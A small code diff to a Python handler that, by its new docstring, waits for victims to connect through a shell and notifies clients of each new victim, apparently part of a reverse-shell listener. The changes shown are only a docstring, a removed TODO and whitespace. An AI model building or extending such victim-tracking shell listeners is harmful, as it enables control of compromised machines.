@@ -11,10 +11,11 @@ IP   = '0.0.0.0'
 
 class Handler(object):
 
-    """Docstring for Handler. """
+    """This class waits for a victim connect through
+    a shell and then sends to every client the message
+    letting they know a new victim has connected"""
 
     def __init__(self):
-        """TODO: to be defined1. """
         self.conns = []
         self.exposer = JsonExposer(self.conns)
         self.exposer.start()
@@ -49,7 +50,7 @@ class Handler(object):
     def notifyOffline(connection):
         print("Offline: {}".format(connection.ip))
         self.exposer.notifyOffline(connection)
-        
+
 
 def main():
     handler = Handler()
@@ -59,5 +60,5 @@ if __name__ == "__main__":
     main()
 
 
-        
-        
+
+
